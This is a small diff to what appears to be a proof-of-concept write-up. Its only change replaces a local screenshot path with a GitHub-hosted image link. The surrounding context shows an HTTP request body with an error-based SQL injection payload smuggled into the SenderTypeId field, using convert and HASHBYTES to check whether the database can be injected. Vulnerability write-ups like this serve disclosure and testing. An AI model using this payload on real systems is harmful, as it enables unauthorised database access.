@@ -25,4 +25,4 @@ Content-Length: 170
 Keywords=&StartSendDate=2024-06-17&EndSendDate=2024-06-17&SenderTypeId=0000000000'and 1=convert(int,(sys.fn_sqlvarbasetostr(HASHBYTES('MD5','123456')))) AND 'CvNI'='CvNI
 ```
 
-![image-20240617173049947](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240617173049947.png)
+![image](https://github.com/hardog123/poc-exp/assets/170905460/407ac7b7-9865-4759-9390-a614a6927d1c)
